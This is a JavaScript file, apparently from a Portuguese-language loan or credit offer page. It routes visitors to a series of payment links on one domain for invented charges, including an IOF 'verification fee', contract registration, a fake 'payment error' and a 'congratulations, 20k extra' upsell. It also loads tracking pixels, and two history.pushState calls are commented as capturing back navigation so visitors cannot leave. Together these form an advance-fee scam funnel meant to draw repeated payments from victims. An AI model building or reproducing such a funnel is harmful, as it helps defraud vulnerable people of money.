const baseLinks = {
    up1: "https://pay.impor-hj.fun/nOzxZooQq9xZJ07", // IOF
    up2: "https://pay.impor-hj.fun/q510ZOb0nk83E9D", // Taxa de verificação de IOF
    up3: "https://pay.impor-hj.fun/YEwR3AVR21kZdKy", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.impor-hj.fun/RmA83Ea2q8r3PVp", // NFe
    up5: "https://pay.impor-hj.fun/nOzxZooQqQVZJ07", // Ativar conta
    up6: "https://pay.impor-hj.fun/NDr8gmKnanpZBmj", // Taxa de registro do contrato
    up7: "https://pay.impor-hj.fun/DPXw3XeE9E9Zzmp", // Parabéns, 20k adicional
    up8: "https://pay.impor-hj.fun/mwK436d1zqXGQ8b", // Erro no pagamento - 14,06
    up9: "https://pay.impor-hj.fun/meABG9dn7DAZ6Ea", // APP - 11,99
    up10:"https://pay.impor-hj.fun/NDr8gmKnadpZBmj", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.impor-hj.fun/DPXw3XeE919Zzmp",// Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.impor-hj.fun/DYp0ZxVMAzlgmvX" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}



// UTMIFY, troque o pixel só aqui, belê?
(function() {
 window.googlePixelId = "688817c3b0633f5bb4fabb5c";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-google.js");
  document.head.appendChild(a);
})();


(function() {
    const script = document.createElement('script');
    
    script.src = 'https://cdn.utmify.com.br/scripts/utms/latest.js';
    script.setAttribute('data-utmify-prevent-xcod-sck', '');
    script.setAttribute('data-utmify-prevent-subids', '');
    script.async = true;
    script.defer = true;

    document.head.appendChild(script);
})();


// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);

history.pushState({}, '', location.href);
